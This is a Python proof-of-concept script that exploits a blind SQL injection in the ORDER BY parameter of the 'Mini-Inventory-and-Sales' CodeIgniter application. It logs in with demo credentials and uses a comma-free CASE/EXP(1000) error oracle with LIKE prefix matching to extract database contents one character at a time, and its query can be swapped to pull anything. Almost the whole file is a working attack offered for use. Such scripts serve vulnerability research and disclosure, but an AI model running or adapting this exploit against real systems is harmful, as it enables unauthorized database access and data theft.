#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mini-Inventory-and-Sales SQLi - comma-free blind extraction script

The injection point is in the ORDER BY clause; CodeIgniter's order_by()
splits the column name on commas, so payloads containing commas break.
This script uses LIKE prefix matching (no commas) + EXP(1000) error
oracle to extract data character by character.

Usage: modify SRC below, then run:  python3 extract.py
"""
import urllib.request, urllib.parse, http.cookiejar

TARGET   = "http://127.0.0.1:8080"
LOGIN_URL = TARGET + "/home/login"
INJ_URL   = TARGET + "/transactions/latr_"
USER, PASS = "demo@1410inc.xyz", "demopass"

# Data to extract (change SRC to extract anything; keep it comma-free)
SRC = "(SELECT version())"
# SRC = "(SELECT table_schema FROM information_schema.tables LIMIT 1)"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("X-Requested-With", "XMLHttpRequest")]

def login():
    req = urllib.request.Request(LOGIN_URL,
        data=f"email={USER}&password={PASS}".encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    op.open(req, timeout=10).read()

def probe(cond_sql):
    """TRUE -> HTTP 200; FALSE -> EXP(1000) error -> 500"""
    payload = "(SELECT CASE WHEN %s THEN 1 ELSE EXP(1000) END)" % cond_sql
    url = INJ_URL + "?orderBy=" + urllib.parse.quote(payload)
    try:
        return op.open(url, timeout=10).status == 200
    except Exception:
        return False

def extract(length=60, charset="0123456789abcdefghijklmnopqrstuvwxyz.-_"):
    known = ""
    for i in range(length):
        hit = False
        for c in charset:
            esc = (known + c).replace("_", "\\_").replace("%", "\\%")
            if probe(SRC + " LIKE '" + esc + "%'"):
                known += c
                print("  [%d] %s" % (len(known), known))
                hit = True
                break
        if not hit:
            break
    return known

if __name__ == "__main__":
    login()
    print("[+] logged in")
    print("[+] extracting: %s" % SRC)
    print("[+] result: '%s'" % extract())
